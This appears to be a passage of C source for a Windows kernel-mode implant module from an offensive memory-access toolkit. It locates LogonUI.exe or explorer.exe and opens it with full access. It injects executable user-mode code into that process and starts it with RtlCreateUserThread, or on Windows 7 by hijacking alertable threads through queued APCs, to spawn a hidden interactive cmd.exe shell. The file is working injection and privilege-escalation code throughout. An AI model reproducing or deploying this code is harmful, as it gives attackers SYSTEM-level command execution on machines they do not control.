// Windows 7 APC ROUTINES BELOW (WORKAROUND FOR MISSING ntoskrnl!RtlCreateUserThread).
//----------------------------------------------------------------------------------------------------------
#ifdef _WIN7_COMPAT

/*
* The KernelApcRoutine is called after the user mode APC is completed. 
*/
VOID KernelApcRoutine(_In_ struct _KAPC *Apc, _Inout_ PVOID *NormalRoutine, _Inout_ PVOID *NormalContext, _Inout_ PVOID *SystemArgument1, _Inout_ PVOID *SystemArgument2)
{
	PKMDDATA pk;
	VOID(*fnExFreePool)(PVOID);
	UNREFERENCED_PARAMETER(NormalRoutine);
	UNREFERENCED_PARAMETER(NormalContext);
	if(SystemArgument1 && *SystemArgument1) {
		pk = (PKMDDATA)*SystemArgument1;
		pk->dataOut[9] = MAGIC_WAIT_WORD;
	}
	if(SystemArgument2 && *SystemArgument2) {
		fnExFreePool = (VOID(*)(PVOID))*SystemArgument2;
		fnExFreePool(Apc);
	}
}

/*
* Wait for dataIn[3] (default: 60) seconds or until pk->dataOut[9] is set to MAGIC_WAIT_WORD value
*/
VOID ActionWaitForExit(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk)
{
	LONGLONG llTimeSecond = -1000000; // 100ms
	QWORD i, max;
	max = pk->dataIn[3] ? pk->dataIn[3] : 60;
	max *= 10;
	for(i = 0; i < max; i++) {
		if(pk->dataOut[9] == MAGIC_WAIT_WORD) {
			pk->dataOut[9] = 0;
			return;
		}
		fnk->KeDelayExecutionThread(KernelMode, FALSE, &llTimeSecond);
	}
	pk->dataOut[0] = ERROR_TIMEOUT;
	pk->dataOut[9] = 0;
}

/*
* Locate the PKAPC_STATE struct inside the PETHREAD opaque structure by searching for
* the first occurance of a reference to the PEPROCESS address location.
*/
PKAPC_STATE GetKApcState(_In_ PEPROCESS pEProcess, _In_ PETHREAD pEThread)
{
	for(DWORD offset = 0; offset < 256; offset += 8) {
		if((QWORD)pEProcess == *(PQWORD)((QWORD)pEThread + offset)) {
			return (PKAPC_STATE)((QWORD)pEThread + offset - 32);
		}
	}
	return NULL;
}

/*
* Locate the PKAPC_STATE struct inside the PETHREAD opaque structure by searching for
* the first occurance of a reference to the PEPROCESS address location.
*/
BOOLEAN GetKApcIsAlertable(_In_ PEPROCESS pEProcess, _In_ PETHREAD pEThread)
{
	QWORD apcs = (QWORD)GetKApcState(pEProcess, pEThread);
	apcs += sizeof(KAPC_STATE) + 3 * 8;
	return *(PBOOLEAN)apcs;
}

/*
* Retrieve a suitable thread that may be used to queue the APC onto.
*/
PETHREAD GetPEThread(_In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, _In_ HANDLE UniqueProcessId, _In_ PEPROCESS pEProcess, _In_ DWORD cSkipThreads)
{
	NTSTATUS nt;
	PSYSTEM_PROCESS_INFORMATION pPI;
	PSYSTEM_THREAD_INFORMATION pTI;
	PETHREAD pEThread = NULL;
	HANDLE UniqueThreadId;
	PBYTE pbSPIBuffer;
	ULONG cbSPIBuffer = 0;
	QWORD i = 0;
	nt = fnk->ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &cbSPIBuffer);
	if(nt != 0xC0000004 || !cbSPIBuffer) {
		return nt;
	}
	pbSPIBuffer = (PBYTE)fnk->ExAllocatePool(0, cbSPIBuffer);
	if(!pbSPIBuffer) { return NULL; }
	nt = fnk->ZwQuerySystemInformation(SystemProcessInformation, pbSPIBuffer, cbSPIBuffer, &cbSPIBuffer);
	if(NT_SUCCESS(nt)) {
		pPI = (PSYSTEM_PROCESS_INFORMATION)pbSPIBuffer;
		while(TRUE) {
			if(pPI->UniqueProcessId == UniqueProcessId) {
				for(i = 0; i < pPI->NumberOfThreads; i++) {
					// TODO: check ThreadInfos internal offset on Win7/Win8 (Win10 = OK)
					pTI = (PSYSTEM_THREAD_INFORMATION)&pPI->ThreadInfos[i];
					UniqueThreadId = pTI->ClientId.UniqueThread;
					nt = fnk2->PsLookupThreadByThreadId(UniqueThreadId, &pEThread);
					if(NT_ERROR(nt) || !GetKApcIsAlertable(pEProcess, pEThread)) {
						continue;
					}
					if(cSkipThreads) {
						cSkipThreads--;
						continue;
					}
					fnk->ExFreePool(pbSPIBuffer);
					return pEThread;
				}
				break;
			}
			if(!pPI->NextEntryOffset) {
				break;
			}
			pPI = (PSYSTEM_PROCESS_INFORMATION)((QWORD)pPI + pPI->NextEntryOffset);
			if(((QWORD)pPI < (QWORD)pbSPIBuffer) || ((QWORD)pPI > (QWORD)pbSPIBuffer + cbSPIBuffer)) {
				break;
			}
		}
	}
	fnk->ExFreePool(pbSPIBuffer);
	return NULL;
}

VOID ActionDefault_QueueApcState(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, 
	PEPROCESS Process, KAPC_STATE ApcState, PVOID pvAddressUserMode)
{
	DWORD i;
	PKAPC pKApc = NULL;
	PETHREAD Thread = NULL;
	PKAPC_STATE Thread_ApcState = NULL;
	QWORD qwPID = pk->dataIn[0];
	// activate APC
	i = 0;
	do {
		Thread = GetPEThread(fnk, fnk2, (HANDLE)qwPID, Process, 0);
		if(!Thread) {
			if(i) { break; }
			pk->dataOut[0] = (QWORD)E_FAIL;
			pk->dataOut[1] = 0x02;
			return;
		}
		Thread_ApcState = GetKApcState(Process, Thread);
		if(!Thread_ApcState) {
			if(i) { break; }
			pk->dataOut[0] = (QWORD)E_FAIL;
			pk->dataOut[1] = 0x03;
			return;
		}
		pKApc = fnk->ExAllocatePool(0, sizeof(KAPC));
		fnk->RtlZeroMemory(pKApc, sizeof(KAPC));
		if(!pKApc) {
			if(i) { break; }
			pk->dataOut[0] = (QWORD)E_FAIL;
			pk->dataOut[1] = 0x08;
			goto fail;
		}
		fnk->RtlZeroMemory(&ApcState, sizeof(KAPC_STATE));
		fnk2->KeInitializeApc(pKApc, Thread, OriginalApcEnvironment, &KernelApcRoutine, NULL, pvAddressUserMode, UserMode, pvAddressUserMode);
		if(!fnk2->KeInsertQueueApc(pKApc, pk, fnk->ExFreePool, 0)) {
			if(i) { break; }
			pk->dataOut[0] = (QWORD)E_FAIL;
			pk->dataOut[1] = 0x09;
			goto fail;
		}
		if(!Thread_ApcState->UserApcPending) {
			Thread_ApcState->UserApcPending = TRUE;
		}
	} while((++i < NUM_PARALELL_APC_THREADS) && pk->dataIn[4]);
	// wait loop for magic wait word
	ActionWaitForExit(pk, fnk);
	return;
fail:
	if(pKApc) { fnk->ExFreePool(pKApc);	}
}
#endif /* _WIN7_COMPAT */

//----------------------------------------------------------------------------------------------------------
// MAIN CODE BELOW:
//----------------------------------------------------------------------------------------------------------

/*
* Module main control routine. Connects to the parent process memory and injects
* user mode code into it. Tries to spawn a thread by using RtlCreateUserThread if
* function is exported by ntoskrnl - if not (win7) a fallback onto more complicated
* KeInsertQueueApc is used instead. The injected code then creates the new process.
*/
VOID ActionDefault(_In_ PKMDDATA pk, _In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2)
{
	NTSTATUS nt;
	OBJECT_ATTRIBUTES ObjectAttributes;
	QWORD qwPID = pk->dataIn[0];
	PEPROCESS Process = NULL;
	PVOID pvAddressUserMode = NULL;
	SIZE_T cbUserModeMemory = 0x1000;
	QWORD qwAddrConsoleBuffer = 0;
	HANDLE ZwProcessHandle = NULL;
	KAPC_STATE ApcState;
	CLIENT_ID ClientId, ClientId_2;
	HANDLE hThread;
	// lookup process
	nt = fnk2->PsLookupProcessByProcessId((HANDLE)qwPID, &Process); // TODO: decrease handle needed???
	if(NT_ERROR(nt)) {
		pk->dataOut[0] = nt;
		pk->dataOut[1] = 0x01;
		return;
	}
	// allocate memory
	fnk->RtlZeroMemory(&ObjectAttributes, sizeof(OBJECT_ATTRIBUTES));
	fnk->RtlZeroMemory(&ClientId, sizeof(CLIENT_ID));
	ClientId.UniqueThread = 0;
	ClientId.UniqueProcess = (HANDLE)qwPID;
	nt = fnk2->ZwOpenProcess(&ZwProcessHandle, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);
	if(NT_ERROR(nt)) {
		pk->dataOut[0] = nt;
		pk->dataOut[1] = 0x04;
		goto fail;
	}
	nt = fnk2->ZwAllocateVirtualMemory(ZwProcessHandle, &pvAddressUserMode, 1, &cbUserModeMemory, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if(NT_ERROR(nt)) {
		pk->dataOut[0] = nt;
		pk->dataOut[1] = 0x05;
		goto fail;
	}
	// Attach to user process memory
	fnk2->KeStackAttachProcess(Process, &ApcState);
	// Allocate memory for console buffer (if needed)
	if(pk->dataIn[2]) {
		qwAddrConsoleBuffer = SetupConsoleBufferUserMode(pk, fnk, fnk2);
		if(!qwAddrConsoleBuffer) {
			pk->dataOut[0] = (QWORD)E_FAIL;
			pk->dataOut[1] = 0x06;
			fnk2->KeUnstackDetachProcess(&ApcState);
			goto fail;
		}
	}
	// Intialize user mode code
	nt = IntializeUserModeCode(pk, fnk, fnk2, (PBYTE)pvAddressUserMode, qwAddrConsoleBuffer);
	if(NT_ERROR(nt)) {
		pk->dataOut[0] = nt;
		pk->dataOut[1] = 0x07;
		fnk2->KeUnstackDetachProcess(&ApcState);
		goto fail;
	}
	// Detach from user process memory
	fnk2->KeUnstackDetachProcess(&ApcState);
	if(fnk2->RtlCreateUserThread) {
		nt = fnk2->RtlCreateUserThread(ZwProcessHandle,	0, FALSE, 0, NULL, NULL, (QWORD)pvAddressUserMode, 0, &hThread, &ClientId_2);
		if(NT_ERROR(nt)) { 
			pk->dataOut[0] = nt;
			pk->dataOut[1] = 0x0A;
			goto fail;
		}
		CommonSleep(fnk, 250);
	} 
#ifdef _WIN7_COMPAT
	else {
		// Windows 7 fallback to more complicated KeInsertQueueApc method.
		ActionDefault_QueueApcState(pk, fnk, fnk2, Process, ApcState, pvAddressUserMode);
	}
#endif /* _WIN7_COMPAT */
fail:
	if(ZwProcessHandle) { fnk->ZwClose(ZwProcessHandle); }
	if(Process) { fnk2->ObDereferenceObject(Process); }
}

NTSTATUS GetProcessNameFromPid(_In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, _In_ HANDLE pid, _In_ SIZE_T cb, _Out_ PBYTE pb)
{
	PEPROCESS Process;
	LPSTR sz;
	SIZE_T csz;
	NTSTATUS nt = fnk2->PsLookupProcessByProcessId(pid, &Process);
	if(NT_SUCCESS(nt)) {
		sz = fnk2->PsGetProcessImageFileName(Process);
		csz = fnk2->strnlen(sz, cb);
		fnk->RtlCopyMemory(pb, sz, csz);
	}
	return nt;
}

NTSTATUS GetPidFromPsName(_In_ PKERNEL_FUNCTIONS fnk, _In_ PKERNEL_FUNCTIONS2 fnk2, _In_ LPSTR szPsName, _Out_ PQWORD pqwPID)
{
	NTSTATUS nt;
	PBYTE pbSPIBuffer;
	ULONG cbSPIBuffer;
	PSYSTEM_PROCESS_INFORMATION pPI;
	CHAR szPsNameBuffer[0x10];
	nt = fnk->ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &cbSPIBuffer);
	if(nt != 0xC0000004 || !cbSPIBuffer) {
		return nt;
	}
	pbSPIBuffer = (PBYTE)fnk->ExAllocatePool(0, cbSPIBuffer);
	if(!pbSPIBuffer) {
		return E_OUTOFMEMORY;
	}
	nt = fnk->ZwQuerySystemInformation(SystemProcessInformation, pbSPIBuffer, cbSPIBuffer, &cbSPIBuffer);
	if(NT_SUCCESS(nt)) {
		pPI = (PSYSTEM_PROCESS_INFORMATION)pbSPIBuffer;
		do {
			fnk->RtlZeroMemory(szPsNameBuffer, 0x10);
			GetProcessNameFromPid(fnk, fnk2, pPI->UniqueProcessId, 0x10, szPsNameBuffer);
			if(0 == fnk->_stricmp(szPsNameBuffer, szPsName)) {
				*pqwPID = (QWORD)pPI->UniqueProcessId;
				break;
			}
			if(!pPI->NextEntryOffset) {
				nt = E_NOT_VALID_STATE;
				break;
			}
			pPI = (PSYSTEM_PROCESS_INFORMATION)((QWORD)pPI + pPI->NextEntryOffset);
		} while(((QWORD)pPI >= (QWORD)pbSPIBuffer) && ((QWORD)pPI < (QWORD)pbSPIBuffer + cbSPIBuffer));
	}
	if(pbSPIBuffer) { fnk->ExFreePool(pbSPIBuffer); }
	return nt;
}

/*
* Module entry point.
*/
VOID c_EntryPoint(_In_ PKMDDATA pk)
{
	KERNEL_FUNCTIONS fnk;
	KERNEL_FUNCTIONS2 fnk2;
	InitializeKernelFunctions(pk->AddrKernelBase, &fnk);
	InitializeKernelFunctions2(pk->AddrKernelBase, &fnk2);
#ifdef _PSCMD_SYSTEM
	CHAR szBINARY[] = { 'L', 'o', 'g', 'o', 'n', 'U', 'I', '.', 'e', 'x', 'e', 0 };
#endif _PSCMD_SYSTEM
#ifdef _PSCMD_USER
	CHAR szBINARY[] = { 'e', 'x', 'p', 'l', 'o', 'r', 'e', 'r', '.', 'e', 'x', 'e', 0 };
#endif _PSCMD_USER
#ifdef _PSCMD
	CHAR szCMD[] = { 'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'c', 'm', 'd', '.', 'e', 'x', 'e', 0 };
	pk->dataIn[1] = 0x08000000; // hidden window
	pk->dataIn[2] = 1; // interactive
	pk->dataIn[4] = 1; // multi thread hijack (boost)
	pk->dataOut[0] = GetPidFromPsName(&fnk, &fnk2, szBINARY, &pk->dataIn[0]);
	if(pk->dataOut[0]) {
		pk->dataOut[1] = 0x101;
		return;
	}
	fnk.RtlCopyMemory(pk->dataInStr, szCMD, sizeof(szCMD));
#endif _PSCMD
	ActionDefault(pk, &fnk, &fnk2);
}
